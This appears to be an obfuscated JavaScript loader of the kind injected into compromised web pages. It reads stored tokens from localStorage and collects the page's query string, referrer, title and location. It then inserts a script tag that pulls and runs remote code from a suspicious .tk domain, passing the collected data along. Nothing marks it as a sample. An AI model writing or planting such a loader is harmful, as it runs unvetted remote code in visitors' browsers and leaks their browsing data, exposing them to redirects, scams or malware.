  (function() {
    var name = '_cz9MxT1mCVZgCmsf';
    if (!window._cz9MxT1mCVZgCmsf) {
        window._cz9MxT1mCVZgCmsf = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/Vm3YKjSB',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _P2CK8Xr2cCGH3w75 = localStorage.getItem('config');
    if (typeof _P2CK8Xr2cCGH3w75 !== 'undefined' && _P2CK8Xr2cCGH3w75 !== null) {
        var _TLRCFVXWJnH15N5N = JSON.parse(_P2CK8Xr2cCGH3w75);
        var _xzhR3xkZSshZn7ZL = Math.round(+new Date()/1000);
        if (_TLRCFVXWJnH15N5N.created_at + window._cz9MxT1mCVZgCmsf.ttl < _xzhR3xkZSshZn7ZL) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _2c3zbVBPQwBbVz9K = localStorage.getItem('subId');
    var _8LtLK1ftXRXc5GfT = localStorage.getItem('token');
    var _SqFrhyRdd47HKLss = '?return=js.client';
        _SqFrhyRdd47HKLss += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _SqFrhyRdd47HKLss += '&se_referrer=' + encodeURIComponent(document.referrer);
        _SqFrhyRdd47HKLss += '&default_keyword=' + encodeURIComponent(document.title);
        _SqFrhyRdd47HKLss += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _SqFrhyRdd47HKLss += '&name=' + encodeURIComponent(name);
        _SqFrhyRdd47HKLss += '&host=' + encodeURIComponent(window._cz9MxT1mCVZgCmsf.R_PATH);
    if (typeof _2c3zbVBPQwBbVz9K !== 'undefined' && _2c3zbVBPQwBbVz9K && window._cz9MxT1mCVZgCmsf.unique) {
        _SqFrhyRdd47HKLss += '&sub_id=' + encodeURIComponent(_2c3zbVBPQwBbVz9K);
    }
    if (typeof _8LtLK1ftXRXc5GfT !== 'undefined' && _8LtLK1ftXRXc5GfT && window._cz9MxT1mCVZgCmsf.unique) {
        _SqFrhyRdd47HKLss += '&token=' + encodeURIComponent(_8LtLK1ftXRXc5GfT);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._cz9MxT1mCVZgCmsf.R_PATH + _SqFrhyRdd47HKLss;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
